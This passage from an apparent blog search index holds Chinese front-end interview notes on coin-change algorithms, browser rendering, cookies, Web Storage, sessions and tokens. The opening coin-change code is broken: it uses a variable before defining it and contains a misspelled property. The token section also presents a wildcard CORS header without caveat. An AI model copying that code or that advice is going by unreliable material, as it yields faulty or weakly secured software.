if(cache[amount])&#123; return cache[amount] &#125; let min = [],newMin,newAmount; for(let i = 0;i&lt;coins.length;++i)&#123; let newAmount = amount -coin,coin = coins[i]; if(newAmount &gt;= 0)&#123; newMin = me.makeChange(newAmount); &#125; if( newAmount&gt;=0&amp;&amp; (newMin.length&lt;min.length-1||!min.length) &amp;&amp;(newMin.lengthh||!newAmount) )&#123; min = [coin].concat(newMin); console.log(min+&apos;for&apos;+amount) &#125; &#125; return (cache[amount]=min) &#125;&#125; 贪心最少硬币123456789101112131415function minChange(coins,amount)&#123; coins = quickSort(coins) let l = coins.length-1,cache = []; while(l&gt;=0&amp;&amp;amount&gt;=0)&#123; if(amount&gt;=coins[l])&#123; cache.push(coins[l]) amount -=coins[l] &#125;else&#123; l-- &#125; &#125; return cache&#125;//问题，只在相邻级别中，前一级比后一级少一半以上才可以[1,2,5,10,20,50,100],如果是[1,3,4]这种不行第一种从较小的硬币集合开始算，只有[1],[1,3],[1,3,4] 数组去重https://zhuanlan.zhihu.com/p/26388217]]></content>
      <categories>
        <category>Algorithm</category>
      </categories>
      <tags>
        <tag>学习指南</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[前端学习指南_浏览器]]></title>
    <url>%2F2019%2F06%2F03%2Finterview_browser%2F</url>
    <content type="text"><![CDATA[前言 前端面试指南_浏览器浏览器组成主流浏览器：Internet Explorer、Firefox、Safari、Chrome 浏览器和 Opera浏览器的主要组件为： 用户界面 - 除了浏览器主窗口显示的页面外，其他的部分，包括地址栏、前进/后退按钮、书签菜单等。 浏览器引擎 - 在用户界面和渲染引擎之间传送指令。 渲染引擎 - 负责显示请求的内容，负责解析 HTML 和 CSS，并将解析后的内容显示在屏幕上。Firefox-Gecko，Safari和Chrome-WebKit 网络 - 用于网络调用，比如 HTTP 请求。其接口与平台无关，并为所有平台提供底层实现。 用户界面后端 - 用于绘制基本的窗口小部件。其公开了与平台无关的通用接口，而在底层使用操作系统的用户界面方法。 JavaScript 解释器。用于解析和执行 JavaScript 代码。 数据存储。这是持久层。浏览器需要在硬盘上保存各种数据，例如 Cookie。新的 HTML 规范 (HTML5) 定义了“网络数据库”，这是一个完整（但是轻便）的浏览器内数据库。内核 浏览器 渲染引擎 JS解释器 Chrome WebKit-&gt;Blink(2013)、 V8 Firefox Gecko SpiderMonkey Safari Webkit Nitro Edge EdgeHTML-&gt;Chromium(Blink) Chakra Opera Presto-&gt;Blink V8 IE Trident Chakra 其他浏览器360浏览器、猎豹浏览器内核：IE+Chrome双内核； 搜狗、遨游、QQ浏览器内核：Trident（兼容模式）+Webkit（高速模式）； 百度浏览器、世界之窗内核：IE内核； 2345浏览器内核：好像以前是IE内核，现在也是IE+Chrome双内核了； UC浏览器内核：这个众口不一，UC说是他们自己研发的U3内核，但好像还是基于Webkit和Trident，还有说是基于火狐内核。 事件循环浏览器环境下，microtask 的任务队列是每个 macrotask 执行完之后执行。而在 Node.js 中，microtask 会在事件循环的各个阶段之间执行，也就是一个阶段执行完毕，就会去执行 microtask 队列的任务。 综合输入URL判断 协议 缓存 输入的是 URL 还是 query域名解析DNS 查询：顺序浏览器缓存-&gt;系统缓存-&gt;路由器缓存-&gt;运营商缓存-&gt;域名递归搜索 建立连接HTTPS TCP三握四挥 发送请求 接受响应 渲染页面 渲染1.加载 当请求响应返回的时候，network thread 会依据 Content-Type及 MIME Type sniffing 判断响应内容的格式 加载过程贼复杂，需要加载各种资源，比如html、css、js或者pdf等等。这里又可以分成两种情况，一种是内容加载，比如需要打开一个新进程、需要打开保存弹窗或者需要直接加载内容；另一种则是子资源下载，比如css、js、图片等等，这里又会涉及到缓存，选择本地读取还是去服务器请求等等一系列的问题。 如果域名或者请求内容匹配到已知的恶意站点，network thread 会展示一个警告页。此外 CORB 检测也会触发确保敏感数据不会被传递给渲染进程 2.解析 解析过程就就是解析上面加载的文件（HTML），建立DOM树的过程， 除了解析HTML生成DOM树，为了提高性能，一般浏览器都会做一些预处理动作，比如：DNS预获取、预加载扫描以及安全扫描(防XSS)等等。 DNS的预获取在前面就顺带提到了，预获取过程就在这里发生的。大家可以回到1688首页可以看到如下一段代码片：12345678&lt;!--dns预解析--&gt; &lt;link rel=&quot;dns-prefetch&quot; href=&quot;//cbu01.alicdn.com&quot; /&gt; &lt;link rel=&quot;dns-prefetch&quot; href=&quot;//img.alicdn.com&quot; /&gt; &lt;link rel=&quot;dns-prefetch&quot; href=&quot;//astyle-src.alicdn.com&quot; /&gt; &lt;link rel=&quot;dns-prefetch&quot; href=&quot;//g.alicdn.com&quot; /&gt; &lt;link rel=&quot;dns-prefetch&quot; href=&quot;//dcms.1688.com&quot; /&gt; &lt;link rel=&quot;dns-prefetch&quot; href=&quot;//gm.mmstat.com&quot; /&gt; &lt;link rel=&quot;dns-prefetch&quot; href=&quot;//log.mmstat.com&quot; /&gt; 这段代码片没有任何逻辑功能，唯一的作用就是主动告诉浏览器，赶紧去请求解析这些域名，我马上要用了，这样可以极大地缩减dns的解析时间。有人可能怀疑，放在头部，难道不会阻塞页面加载？实际上并不会，查了一下Chrome的文档，这玩意甚至都没有用浏览器的网络栈。Chrome会启动8个异步线程，啥都不干，就蹲在那里等浏览器给他丢任务（队列），然后去找操作系统要解析，这个过程唯一的作用就是提前触发DNS解析，后面再来的时候就直接走缓存了，实际上这8个线程只是下个任务罢了。除了上面这种写法来触发DNS的预获取，实际浏览器还会搞个线程去扫描html文件，看到域名以后也会丢给上面那8个线程。 3.构建DOM树 DOM本身没有任何渲染能力，我们渲染的也不是DOM。webkit会为DOM树建立一堆渲染树，这些渲染树再用于渲染。 渲染树是归属于DOM树的。渲染树是只存在于上下文中，上下文结束，树销毁；下次再次渲染，再新建一个渲染树。渲染树包含了渲染需要的一切信息。渲染树的节点会有不同种类，下面是几种常见的（都是从一个基类继承出来的），这些类都有自己的渲染方法，你只需要告诉它，该你出场了，他们自己就有方法去把自己画好解析html，生成一个DOM树，解析过程中遇到了script标签就会执行，注意的是，执行js会阻塞DOM的解析，这也是为什么都提倡把不重要的代码放到body的最后面来执行。 如果有些代码确实需要放在靠前的位置，可以写考虑写成异步的方式来避免阻塞页面渲染。新浏览器一般都支持了defer和async属性，其中defer属性的script的下载不会阻塞html解析，而且其会在解析完成后才执行；async属性则是下载不会阻塞html解析，但是执行还是会阻塞。这是因为JavaScript不只是可以改DOM，它还可以更改样式，也就是它可以更改CSSOM。前面我们介绍，不完整的CSSOM是无法使用的，但JavaScript中想访问CSSOM并更改它，那么在执行JavaScript时，必须要能拿到完整的CSSOM。所以就导致了一个现象，如果浏览器尚未完成CSSOM的下载和构建，而我们却想在此时运行脚本，那么浏览器将延迟脚本执行和DOM构建，直至其完成CSSOM的下载和构建。也就是说，在这种情况下，浏览器会先下载和构建CSSOM，然后再执行JavaScript，最后在继续构建DOM。 4.加载次级的资源网页中常常包含诸如图片，CSS，JS 等额外的资源，这些资源需要从网络上或者 cache 中获取。主进程可以在构建 DOM 的过程中会逐一请求它们，为了加速 preload scanner 会同时运行，如果在 html 中存在 &lt;img&gt; &lt;link&gt; 等标签，preload scanner 会把这些请求传递给 Browser process 中的 network thread 进行相关资源的下载。 5.样式计算进程还会基于 CSS 选择器解析 CSS 获取每一个节点的最终的计算样式值。即使不提供任何 CSS，浏览器对每个元素也会有一个默认的样式 6.获取布局 想要渲染一个完整的页面，除了获知每个节点的具体样式，还需要获知每一个节点在页面上的位置，布局其实是找到所有元素的几何关系的过程。其具体过程如下： 通过遍历 DOM 及相关元素的计算样式，主线程会构建出包含每个元素的坐标信息及盒子大小的布局树。布局树和 DOM 树类似，但是其中只包含页面可见的元素，如果一个元素设置了 display:none ，这个元素不会出现在布局树上，伪元素虽然在 DOM 树上不可见，但是在布局树上是可见的。 7.绘制各元素浏览器引擎通过 DOM Tree 和 CSS Rule Tree 构建 Rendering Tree即使知道了不同元素的位置及样式信息，我们还需要知道不同元素的绘制先后顺序才能正确绘制出整个页面。在绘制阶段，主线程会遍历布局树以创建绘制记录。绘制记录可以看做是记录各元素绘制先后顺序的笔记。 8.合成帧最终通过调用Native GUI 的 API 绘制网页画面，称为 Paint复合是一种分割页面为不同的层，并单独栅格化，随后组合为帧的技术。不同层的组合由 compositor 线程（合成器线程）完成。主线程会遍历布局树来创建层树（layer tree），添加了 will-change CSS 属性的元素，会被看做单独的一层， z-index 9.事件处理 在构建Rendering Tree的同时，生成Javascript 脚本文件加载后， 通过 DOM API 和 CSSOM API 来操作 DOM Tree 和 CSS Rule Tree事件发生时，浏览器进程会发送事件类型及相应的坐标给渲染进程，渲染进程随后找到事件对象并执行所有绑定在其上的相关事件处理函数。件委托，基于事件冒泡，我们常常在最顶层绑定事件： 12345document.body.addEventListener(&apos;touchstart&apos;, event =&gt; &#123; if (event.target === area) &#123; event.preventDefault(); &#125;&#125;); 事件分法deligation Repaint当元素改变的时候，将不会影响元素在页面当中的位置（比如 background-color, border-color, visibility），浏览器仅仅会应用新的样式重绘此元素，此过程称为 Repaint。 重绘:当render tree中的一些元素需要更新属性，而这些属性只是影响元素的外观、风格，而不会影响布局的，比如background-color。 Reflow当元素改变的时候，将会影响文档内容或结构，或元素位置，此过程称为 Reflow。（ HTML 使用的是 flow based layout ，也就是流式布局，所以，如果某元件的几何尺寸发生了变化，需要重新布局，也就叫 Reflow。） 回流:当render tree中的一部分(或全部)因为元素的规模尺寸、布局、隐藏等改变而需要重新构建回流必定会发生重绘，重绘不一定会引发回流。重绘和回流会在我们设置节点样式时频繁出现，同时也会很大程度上影响性能。回流所需的成本比重绘高的多，改变父节点里的子节点很可能会导致父节点的一系列回流。 1）常见引起回流属性和方法任何会改变元素几何信息(元素的位置和尺寸大小)的操作，都会触发回流， 添加或者删除可见的DOM元素；元素尺寸改变——边距、填充、边框、宽度和高度内容变化，比如用户在input框中输入文字浏览器窗口尺寸改变——resize事件发生时计算 offsetWidth 和 offsetHeight 属性设置 style 属性的值 重排width height margin padding display border position overflow clientWidth/Height/Top/Left offsetWidth/Height/Top/Left scrollWidth/Height/Top/Left scrollIntoView ScrollTo scrollIntoViewIfNeeded getComputedStyle getBoundingClientRect 重绘color border-style viisbilitybackground text-decoration background-image background-position background-repeat outline-color outline outline-style border-radius outline-width box-shadow background-size 不同的浏览器对于CSS和HTML的处理方式不同如果有的浏览器的渲染引擎是需要等待CSS加载完成之后，对HTML元素进行渲染和展示的，那么在CSS加载完成之前，页面上不有任何信息，这种现象称为白屏（谷歌Chrome和苹果Safari）而有的是先对HTML元素进行展示，然后等待CSS加载完成之后重新对样式进行修改，那么在CSS加载完之前，会首先在页面上显示没有任何CSS渲染的信息，这种现象称为FOUC(无样式内容闪烁)（IE和Firefox火狐） 问题四：为什么操作 DOM 慢因为 DOM 是属于渲染引擎中的东西，而 JS 又是 JS 引擎中的东西。当我们通过 JS 操作 DOM 的时候，其实这个操作涉及到了两个线程之间的通信，那么势必会带来一些性能上的损耗。操作 DOM 次数一多，也就等同于一直在进行线程之间的通信，并且操作 DOM 可能还会带来重绘回流的情况，所以也就导致了性能上的问题。 问题五：渲染页面时常见哪些不良现象？由于浏览器的渲染机制不同，在渲染页面时会出现两种常见的不良现象—-白屏问题和FOUS（无样式内容闪烁） FOUC：由于浏览器渲染机制（比如firefox），再CSS加载之前，先呈现了HTML，就会导致展示出无样式内容，然后样式突然呈现的现象； 白屏：有些浏览器渲染机制（比如chrome）要先构建DOM树和CSSOM树，构建完成后再进行渲染，如果CSS部分放在HTML尾部，由于CSS未加载完成，浏览器迟迟未渲染，从而导致白屏；也可能是把js文件放在头部，脚本会阻塞后面内容的呈现，脚本会阻塞其后组件的下载，出现白屏问题。 白屏和FOUC现象 不同的浏览器对于CSS和HTML的处理方式不同 如果有的浏览器的渲染引擎是需要等待CSS加载完成之后，对HTML元素进行渲染和展示的，那么在CSS加载完成之前，页面上不有任何信息，这种现象称为白屏（谷歌Chrome和苹果Safari） 而有的是先对HTML元素进行展示，然后等待CSS加载完成之后重新对样式进行修改，那么在CSS加载完之前，会首先在页面上显示没有任何CSS渲染的信息，这种现象称为FOUC(无样式内容闪烁)（IE和Firefox火狐） 工作原理 渲染API存储一、Cookie1. Cookie的来源Cookie 的本职工作并非本地存储，而是“维持状态”。 因为HTTP协议是无状态的，HTTP协议自身不对请求和响应之间的通信状态进行保存，通俗来说，服务器不知道用户上一次做了什么，这严重阻碍了交互式Web应用程序的实现。在典型的网上购物场景中，用户浏览了几个页面，买了一盒饼干和两瓶饮料。最后结帐时，由于HTTP的无状态性，不通过额外的手段，服务器并不知道用户到底买了什么，于是就诞生了Cookie。它就是用来绕开HTTP的无状态性的“额外手段”之一。服务器可以设置或读取Cookies中包含信息，借此维护用户跟服务器会话中的状态。 我们可以把Cookie 理解为一个存储在浏览器里的一个小小的文本文件，它附着在 HTTP 请求上，在浏览器和服务器之间“飞来飞去”。它可以携带用户信息，当服务器检查 Cookie 的时候，便可以获取到客户端的状态。 在刚才的购物场景中，当用户选购了第一项商品，服务器在向用户发送网页的同时，还发送了一段Cookie，记录着那项商品的信息。当用户访问另一个页面，浏览器会把Cookie发送给服务器，于是服务器知道他之前选购了什么。用户继续选购饮料，服务器就在原来那段Cookie里追加新的商品信息。结帐时，服务器读取发送来的Cookie就行了。 2. 什么是Cookie及应用场景Cookie指某些网站为了辨别用户身份而储存在用户本地终端上的数据(通常经过加密)。 cookie是服务端生成，客户端进行维护和存储。通过cookie,可以让服务器知道请求是来源哪个客户端，就可以进行客户端状态的维护，比如登陆后刷新，请求头就会携带登陆时response header中的set-cookie,Web服务器接到请求时也能读出cookie的值，根据cookie值的内容就可以判断和恢复一些用户的信息状态。 如上图所示，Cookie 以键值对的形式存在。 典型的应用场景有： 记住密码，下次自动登录。 购物车功能。 记录用户浏览数据，进行商品（广告）推荐。 3. Cookie的原理及生成方式Cookie的原理 第一次访问网站的时候，浏览器发出请求，服务器响应请求后，会在响应头里面添加一个Set-Cookie选项，将cookie放入到响应请求中，在浏览器第二次发请求的时候，会通过Cookie请求头部将Cookie信息发送给服务器，服务端会辨别用户身份，另外，Cookie的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。 Cookie的生成方式主要有两种： 生成方式一：http response header中的set-cookie 我们可以通过响应头里的 Set-Cookie 指定要存储的 Cookie 值。默认情况下，domain 被设置为设置 Cookie 页面的主机名，我们也可以手动设置 domain 的值。 1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2018 07:28:00 GMT;//可以指定一个特定的过期时间（Expires）或有效期（Max-Age） 当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。 内存cookie，是指没有设在cookie的Expires的属性，此时cookie将停留在客户端的内存中，只有在该IE窗口中从“文件－新建－ 窗口”打开的新的IE窗和由form的target属性为_blank产生的新的IE窗口才共享同一个cookie信息。IE，Chome的选项卡都共享同一个cookie信息。 硬盘cookie，是指在你设置了cookie的Expires属性，此时cookie将保存到你的硬盘上。此时所有的窗口将共享同一个名字的cookie。 生成方式二：js中可以通过document.cookie可以读写cookie，以键值对的形式展示 例如我们在掘金社区控制台输入以下三句代码，便可以在Chrome 的 Application 面板查看生成的cookie: 123document.cookie="userName=hello"document.cookie="gender=male"document.cookie='age=20;domain=.baidu.com' 从上图中我们可以得出： Domain 标识指定了哪些域名可以接受Cookie。如果没有设置domain，就会自动绑定到执行语句的当前域。 如果设置为”.baidu.com”,则所有以”baidu.com”结尾的域名都可以访问该Cookie，所以在掘金社区上读取不到第三条代码存储Cookie值。 4. Cookie的缺陷 Cookie 不够大 Cookie的大小限制在4KB左右，对于复杂的存储需求来说是不够用的。当 Cookie 超过 4KB 时，它将面临被裁切的命运。这样看来，Cookie 只能用来存取少量的信息。此外很多浏览器对一个站点的cookie个数也是有限制的。 这里需注意：各浏览器的cookie每一个name=value的value值大概在4k，所以4k并不是一个域名下所有的cookie共享的,而是一个name的大小。 过多的 Cookie 会带来巨大的性能浪费 Cookie 是紧跟域名的。同一个域名下的所有请求，都会携带 Cookie。大家试想，如果我们此刻仅仅是请求一张图片或者一个 CSS 文件，我们也要携带一个 Cookie 跑来跑去（关键是 Cookie 里存储的信息并不需要），这是一件多么劳民伤财的事情。Cookie 虽然小，请求却可以有很多，随着请求的叠加，这样的不必要的 Cookie 带来的开销将是无法想象的。 cookie是用来维护用户信息的，而域名(domain)下所有请求都会携带cookie，但对于静态文件的请求，携带cookie信息根本没有用，此时可以通过cdn（存储静态文件的）的域名和主站的域名分开来解决。 由于在HTTP请求中的Cookie是明文传递的，所以安全性成问题，除非用HTTPS。 5. Cookie与安全对于 cookie 来说，我们还需要注意安全性。 HttpOnly 不支持读写，浏览器不允许脚本操作document.cookie去更改cookie， 所以为避免跨域脚本 (XSS) 攻击，通过JavaScript的 Document.cookie API无法访问带有 HttpOnly 标记的Cookie，它们只应该发送给服务端。如果包含服务端 Session 信息的 Cookie 不想被客户端 JavaScript 脚本调用，那么就应该为其设置 HttpOnly 标记。 1Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly 标记为 Secure 的Cookie只应通过被HTTPS协议加密过的请求发送给服务端。但即便设置了 Secure 标记，敏感信息也不应该通过Cookie传输，因为Cookie有其固有的不安全性，Secure 标记也无法提供确实的安全保障。 为了弥补 Cookie 的局限性，让“专业的人做专业的事情”，Web Storage 出现了。 HTML5中新增了本地存储的解决方案—-Web Storage，它分成两类：sessionStorage和localStorage。这样有了WebStorage后，cookie能只做它应该做的事情了——作为客户端与服务器交互的通道，保持客户端状态。 LocalStorage 是一种本地存储的公共资源，域名下很多应用共享这份资源会有风险；LocalStorage 是以页面域名划分的，如果有多个等价域名之间的 LocalStorage 不互通，则会造成缓存多份浪费。 LocalStorage 在 PC 上的兼容性不太好，而且当网络速度快、协商缓存响应快时使用 localStorage 的速度比不上 304。并且不能缓存 css 文件。而移动端由于网速慢，使用 localStorage 要快于 304。 而相对 LocalStorage 来说，SessionStorage 的数据只存储到特定的会话中，不属于持久化的存储，所以关闭浏览器会清除数据。和 localstorage 具有相同的方法。 二、Web Storage API在HTML5中添加的在本地存储数据的新选项，从cookie用于保存客户端与服务器通信，但Web Storage API用于保存比cookie更大的客户端数据 1）LocalStorage1. LocalStorage的特点 保存的数据长期存在，下一次访问该网站的时候，网页可以直接读取以前保存的数据。 大小为5M左右 仅在客户端使用，不和服务端进行通信 接口封装较好 多选项卡之间同步数据 基于上面的特点，LocalStorage可以作为浏览器本地缓存方案，用来提升网页首屏渲染速度(根据第一请求返回时，将一些不变信息直接存储在本地)。 2.存入/读取数据localStorage保存的数据，以“键值对”的形式存在。也就是说，每一项数据都有一个键名和对应的值。所有的数据都是以文本格式保存。 存入数据使用setItem方法。它接受两个参数，第一个是键名，第二个是保存的数据。 1localStorage.setItem("key","value"); 读取数据使用getItem方法。它只有一个参数，就是键名。 1var valueLocal = localStorage.getItem("key"); 具体步骤，请看下面的例子： 1234567891011121314151617181920212223&lt;script&gt; if(window.localStorage)&#123; localStorage.setItem（'name','world'） localStorage.setItem（“gender','famale'） &#125;&lt;/script&gt;&lt;body&gt; &lt;div id="name"&gt;&lt;/div&gt; &lt;div id="gender"&gt;&lt;/div&gt; &lt;script&gt; var name = localStorage.getItem("name"); var gender = localStorage.getItem("gender"); document.getElementById("name").innerHTML = name; document.getElementById("gender").innerHTML = gender; &lt;/script&gt;&lt;/body&gt;&lt;script&gt; window.adddEventListener('storage',()=&gt;&#123; console.log('local storage has been updated') &#125;) //支持度可能不够&lt;/script&gt; 3. 使用场景LocalStorage在存储方面没有什么特别的限制，理论上 Cookie 无法胜任的、可以用简单的键值对来存取的数据存储任务，都可以交给 LocalStorage 来做。 这里给大家举个例子，考虑到 LocalStorage 的特点之一是持久，有时我们更倾向于用它来存储一些内容稳定的资源。比如图片内容丰富的电商网站会用它来存储 Base64 格式的图片字符串： 除非适应localStorage.removeItem(‘key’)删除单个键值对，或localStorage.clear()清除所有数据 2）sessionStoragesessionStorage保存的数据用于浏览器的一次会话，当会话结束（通常是该窗口关闭），数据被清空；sessionStorage 特别的一点在于，即便是相同域名下的两个页面，只要它们不在同一个浏览器窗口中打开，那么它们的 sessionStorage 内容便无法共享；localStorage 在所有同源窗口中都是共享的；cookie也是在所有同源窗口中都是共享的。除了保存期限的长短不同，SessionStorage的属性和方法与LocalStorage完全一样。 1.sessionStorage的特点 会话级别的浏览器存储 大小为5M左右 仅在客户端使用，不和服务端进行通信 接口封装较好 基于上面的特点，sessionStorage 可以有效对表单信息进行维护，比如刷新时，表单信息不丢失。 2. 使用场景sessionStorage 更适合用来存储生命周期和它同步的会话级别的信息。这些信息只适用于当前会话，当你开启新的会话时，它也需要相应的更新或释放。比如微博的 sessionStorage就主要是存储你本次会话的浏览足迹： lasturl 对应的就是你上一次访问的 URL 地址，这个地址是即时的。当你切换 URL 时，它随之更新，当你关闭页面时，留着它也确实没有什么意义了，干脆释放吧。这样的数据用 sessionStorage 来处理再合适不过。 3.sessionStorage 、localStorage 和 cookie 之间的区别 共同点：都是保存在浏览器端，且都遵循同源策略。 不同点：在于生命周期与作用域的不同 作用域：localStorage只要在相同的协议、相同的主机名、相同的端口下，就能读取/修改到同一份localStorage数据。sessionStorage比localStorage更严苛一点，除了协议、主机名、端口外，还要求在同一窗口（也就是浏览器的标签页）下 生命周期：localStorage 是持久化的本地存储，存储在其中的数据是永远不会过期的，使其消失的唯一办法是手动删除；而 sessionStorage 是临时性的本地存储，它是会话级别的存储，当会话结束（页面被关闭）时，存储内容也随之被释放。 Web Storage 是一个从定义到使用都非常简单的东西。它使用键值对的形式进行存储，这种模式有点类似于对象，却甚至连对象都不是——它只能存储字符串，要想得到对象，我们还需要先对字符串进行一轮解析。 说到底，Web Storage 是对 Cookie 的拓展，它只能用于存储少量的简单数据。当遇到大规模的、结构复杂的数据时，Web Storage 也爱莫能助了。这时候我们就要清楚我们的终极大 boss——IndexedDB！ 四、Session会话，服务器就要给每个客户端分配不同的“身份标识”。 Session是一种记录客户状态的机制，不同于Cookie的是Cookie保存在客户端浏览器中，而Session保存在服务器上。 客户端浏览器访问服务器的时候，服务器把客户端信息以某种形式记录在服务器上。这就是Session。 客户端浏览器再次访问时只需要从该Session中查找该客户的状态就可以了。 如果说Cookie机制是通过检查客户身上的”通行证”来确定客户身份的话， 那么Session机制就是通过检查服务器上的”客户明细表”来确认客户身份。 Session相当于程序在服务器上建立的一份客户档案， 客户来访的时候只需要查询客户档案表就可以了。 服务器使用session把用户的信息临时保存在了服务器上，用户离开网站后session会被销毁。这种用户信息存储方式相对cookie来说更安全，可是session有一个缺陷：如果web服务器做了负载均衡，那么下一个操作请求到了另一台服务器的时候session会丢失。 Session机制一方面，我们可以把客户端浏览器与服务器之间一系列交互的动作称为一个 Session。 从这个语义出发，我们会提到Session持续的时间，会提到在Session过程中进行了什么操作等等。 另一方面，Session指的是服务器端为客户端所开辟的存储空间，该空间保存的信息就是用于保持状态。 从这个语义出发，我们则会提到往Session中存放什么内容，如何根据键值从Session中获取匹配的内容等。 要使用Session，当然是先要创建Session。那么Session在何时创建呢？ Session在服务器端程序运行的过程中创建的，不同语言实现的应用程序有不同创建Session的方法， 在Java中是通过调用HttpServletRequest的getSession方法(使用true作为参数)创建的。 创建Session的同时，服务器会为该Session生成唯一的session id， 这个session id在随后的请求中会被用来重新获得已经创建的Session Session被创建之后，就可以调用Session相关的方法往Session中增加内容了， 而这些内容只会保存在服务器中，发到客户端的只有session id 当客户端再次发送请求的时候，会将这个session id带上， 服务器接受到请求之后就会依据session id找到相应的Session，从而再次使用Session。 Session的生命周期Session保存在服务器端。为了获得更高的存取速度，服务器一般把Session放在内存中。 每个用户都会有一个独立的Session。 如果Session内容过于复杂，当大量客户访问服务器时可能会导致内存溢出。 因此，Session里的信息应该尽量精简。 Session在用户第一次访问服务器的时候自动创建。 需要注意只有访问JSP、Servlet等程序时才会创建Session， 只访问HTML、IMAGE等静态资源并不会创建Session。 如果尚未生成Session，也可以使用request.getSession(true)强制生成Session。 Session生成后，只要用户继续访问，服务器就会更新Session的最后访问时间，并维护该Session。 用户每访问服务器一次，无论是否读写Session，服务器都认为该用户的Session”活跃(active)”了一次。 1session的生命周期当一个Session开始时，Servlet容器会创建一个HttpSession对象，那么在HttpSession对象中，可以存放用户状态的信息。Servlet容器为HttpSession对象分配一个唯一标识符即Sessionid，Servlet容器把Sessionid作为一种Cookie保存在客户端的 *浏览器* 中。 ​ 用户每次发出Http请求时，Servlet容器会从HttpServletRequest对象中取出Sessionid,然后根据这个Sessionid找到相应的HttpSession对象，从而获取用户的状态信息。 我们知道Session是存在于服务器端的，当把浏览器关闭时，浏览器并没有向服务器发送任何请求来关闭Session，自然Session也不会被销毁，但是可以做一点努力，在所有的客户端页面里使用js的window.onclose来监视浏览器的关闭动作，然后向服务器发送一个请求来关闭Session，但是这种做法在实际的开发中也是不推荐使用的，最正常的办法就是不去管它，让它等到默认的时间后，自动销毁。那么为什么当我们关闭浏览器后，就再也访问不到之前的session了呢？其实之前的Session一直都在服务器端，而当我们关闭浏览器时，此时的Cookie是存在于浏览器的进程中的，当浏览器关闭时，Cookie也就不存在了。 其实Cookie有两种: 一种是存在于浏览器的进程中; 一种是存在于硬盘上 而session的Cookie是存在于浏览器的进程中，那么这种Cookie我们称为会话Cookie，当我们重新打开浏览器窗口时，之前的Cookie中存放的Sessionid已经不存在了，此时服务器从HttpServletRequest对象中没有检查到sessionid，服务器会再发送一个新的存有Sessionid的Cookie到客户端的浏览器中，此时对应的是一个新的会话，而服务器上原先的session等到它的默认时间到之后，便会自动销毁。 当在同一个浏览器中同时打开多个标签，发送同一个请求或不同的请求，仍是同一个session; ​ 当不在同一个窗口中打开相同的浏览器时，发送请求，仍是同一个session; ​ 当使用不同的浏览器时，发送请求，即使发送相同的请求，是不同的session; ​ 当把当前某个浏览器的窗口全关闭，再打开，发起相同的请求时，就是本文所阐述的，是不同的session,但是它和session的生命周期是没有关系的. Session的有效期由于会有越来越多的用户访问服务器，因此Session也会越来越多。 为防止内存溢出，服务器会把长时间内没有活跃的Session从内存删除。 这个时间就是Session的超时时间。如果超过了超时时间没访问过服务器，Session就自动失效了。 Session的超时时间为maxInactiveInterval属性， 可以通过对应的getMaxInactiveInterval()获取，通过setMaxInactiveInterval(longinterval)修改。 Session的超时时间也可以在web.xml中修改。 另外，通过调用Session的invalidate()方法可以使Session失效。 Cookie和Session的的区别 HTTP协议是无状态的协议，服务端需要记录用户的状态，就需要用某种机制来识别具体的用户，这个机制就是Session。 Session典型的应用场景就是购物车，当点击下单按钮时，由于HTTP协议无状态，所以并不知道是哪个用户操作的， 所以服务端要为特定的用户创建了特定的Session，用于标识这个用户，并且跟踪用户，这样才知道购物车里面的商品情况。 这个Session是保存在服务端的，有一个唯一标识。在服务端保存Session的方法很多，内存、数据库、文件都有。 集群的时候也要考虑Session的转移，在大型的网站，一般会有专门的Session服务器集群， 用来保存用户会话，这个时候 Session 信息都是放在内存的，此外，一些缓存服务比如Memcached之类的来放 Session。 服务端使用Cookie来识别特定的客户。每次HTTP请求的时候，客户端都会发送相应的Cookie信息到服务端。 实际上大多数的应用都是用 Cookie 来实现Session跟踪的， 第一次创建Session的时候，服务端会在HTTP协议中告诉客户端，需要在 Cookie 里面记录一个session id， 以后每次请求把这个 session id发送到服务器，这样就可以使用对应的Seesion了。 如果客户端的浏览器禁用了 Cookie 怎么办？ 一般这种情况下，会使用一种叫做URL重写的技术来进行会话跟踪， 即每次HTTP交互，URL后面都会被附加上一个诸如 sid=xxxxx 这样的参数，服务端据此来识别用户。 Cookie其实还可以用在一些方便用户的场景下， 设想你某次登陆过一个网站，下次登录的时候不想再次输入账号了，怎么办？ 这个信息可以写到Cookie里面，访问网站的时候， 网站页面的脚本可以读取这个信息，就自动帮你把用户名给填了， 能够方便一下用户。这也是Cookie名称的由来，给用户的一点甜头。 五、Token在Web领域基于Token的身份验证随处可见。在大多数使用Web API的互联网公司中，tokens 是多用户下处理认证的最佳方式。 以下几点特性会让你在程序中使用基于Token的身份验证 无状态、可扩展 支持移动设备 跨程序调用 安全 那些使用基于Token的身份验证的大佬们 大部分你见到过的API和Web应用都使用tokens。例如Facebook, Twitter, Google+, GitHub等。 用户输入登陆凭据； 基于服务器的验证我们都是知道HTTP协议是无状态的，这种无状态意味着程序需要验证每一次请求，从而辨别客户端的身份。 在这之前，程序都是通过在服务端存储的登录信息来辨别请求的。这种方式一般都是通过存储Session来完成。 随着Web，应用程序，已经移动端的兴起，这种验证的方式逐渐暴露出了问题。尤其是在可扩展性方面。 基于服务器验证方式暴露的一些问题 Seesion：每次认证用户发起请求时，服务器需要去创建一个记录来存储信息。当越来越多的用户发请求时，内存的开销也会不断增加。 可扩展性：在服务端的内存中使用Seesion存储登录信息，伴随而来的是可扩展性问题。 CORS(跨域资源共享)：当我们需要让数据跨多台移动设备上使用时，跨域资源的共享会是一个让人头疼的问题。在使用Ajax抓取另一个域的资源，就可以会出现禁止请求的情况。 CSRF(跨站请求伪造)：用户在访问银行网站时，他们很容易受到跨站请求伪造的攻击，并且能够被利用其访问其他的网站。 在这些问题中，可扩展行是最突出的。因此我们有必要去寻求一种更有行之有效的方法。 基于Token的验证原理基于Token的身份验证是无状态的，我们不将用户信息存在服务器或Session中。 这种概念解决了在服务端存储信息时的许多问题 NoSession意味着你的程序可以根据需要去增减机器，而不用去担心用户是否登录。 基于Token的身份验证的过程如下: 用户通过用户名和密码发送请求。 程序验证。 程序返回一个签名的token 给客户端。 客户端储存token,并且每次用于每次发送请求。 服务端验证token并返回数据。 每一次请求都需要token。token应该在HTTP的头部发送从而保证了Http请求无状态。我们同样通过设置服务器属性Access-Control-Allow-Origin:* ，让服务器能接受到来自所有域的请求。 